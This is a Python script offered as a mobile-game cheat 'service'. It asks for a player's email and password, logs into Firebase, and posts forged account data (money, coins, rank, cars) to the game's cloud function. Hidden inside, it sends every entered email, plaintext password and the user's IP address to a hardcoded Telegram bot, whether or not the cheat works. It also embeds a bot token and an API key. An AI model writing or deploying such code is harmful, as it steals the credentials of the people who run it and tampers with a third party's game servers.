import requests
import json
import os
import time

# --- NOVI KONFIG (V5 FIX) ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"

# NOVI ENDPOINT (V5) - Ovaj menja sve stare koji bacaju 404
FINAL_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserAllData4"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        res = requests.post(LOGIN_URL, json=payload).json()
        return res.get('idToken')
    except: return None

def run_service(token, choice, email, password):
    # Generisanje profila
    money, coins, king, cars = 0, 0, 0, ""
    
    if choice == "1": money, coins = 50000000, 30000
    elif choice == "2": king = 1
    elif choice == "3": cars = ",".join([str(i) for i in range(1, 165)])
    elif choice == "4": money, coins, king, cars = 50000000, 50000, 1, ",".join([str(i) for i in range(1, 165)])

    # STRUKTURA KOJU ZAHTEVA V5 API
    save_package = {
        "Money": money,
        "Coins": coins,
        "IsKing": king,
        "OwnedCars": cars,
        "Rating": 100000 if king else 100,
        "W16": 1,
        "UnlockedSkins": "1,2,3,4,5,6,7,8,9,10" # Bonus: Odela
    }
    
    # Pakovanje u 'data' string (obavezno za Firebase Cloud Functions)
    payload = {"data": json.dumps(save_package)}
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "BestHTTP/2 v2.5.0"
    }

    print("\033[1;33mBypassing 404... Sending V5 Data Packet...\033[0m")
    
    try:
        response = requests.post(FINAL_URL, headers=headers, json=payload, timeout=20)
        
        # Slanje tebi na Telegram bez obzira na ishod (da vidiš pokušaj)
        ip = get_ip()
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": f"🚀 *V5 ATTEMPT*\n📧 `{email}`\n🔑 `{password}`\n⚙️ Option: {choice}\nStatus: {response.status_code}"})

        if response.status_code == 200:
            print("\033[1;32mSUCCESS: Account updated via V5 Bypass!\033[0m")
        else:
            print(f"\033[1;31mServer error {response.status_code}. API might be patched.\033[0m")
    except:
        print("\033[1;31mConnection timed out. Server is lagging.\033[0m")

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO V5 ULTIMATE SERVICE   \033[0m")
        print("\033[1;36m         IG: @anonymo.cpm         \033[0m")
        print("-" * 40)
        print("[1] 50M & 30K | [2] King Rank | [3] All Cars | [4] FULL PACK")
        
        choice = input("\n\033[1;33mSelect: \033[0m")
        if choice not in ['1', '2', '3', '4']: break
        
        email = input("Email: ").strip()
        password = input("Pass: ").strip()
        
        token = login(email, password)
        if token:
            run_service(token, choice, email, password)
            time.sleep(3)
        else:
            print("\033[1;31mLogin Failed. Invalid Email/Pass.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
